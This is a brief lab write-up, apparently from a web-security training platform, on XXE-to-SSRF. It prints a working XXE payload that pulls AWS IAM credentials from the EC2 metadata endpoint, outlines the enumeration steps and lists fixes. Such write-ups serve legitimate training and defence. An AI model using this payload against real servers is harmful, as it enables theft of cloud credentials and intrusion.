# Lab 2: XXE to Perform SSRF
**Difficulty:** Apprentice
**Status:** ✅ Solved

## Vulnerability
XXE used to make server-side requests to internal endpoints.
AWS EC2 metadata endpoint accessible at 169.254.169.254.

## Final Payload

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
    <stockCheck>
        <productId>&xxe;</productId>
        <storeId>1</storeId>
    </stockCheck>

## Steps
1. Started with http://169.254.169.254/
2. Enumerated path step by step
3. latest/ → meta-data/ → iam/ → security-credentials/ → admin
4. Final response contained IAM credentials JSON
5. AccessKeyId and SecretAccessKey extracted

## Why It Works
Server makes HTTP request on attacker's behalf.
AWS metadata endpoint trusted internal requests.
IAM credentials exposed through iterative enumeration.

## Fix
Disable external entities.
Block server-side requests to cloud metadata endpoints.
Implement IMDSv2 on AWS instances.
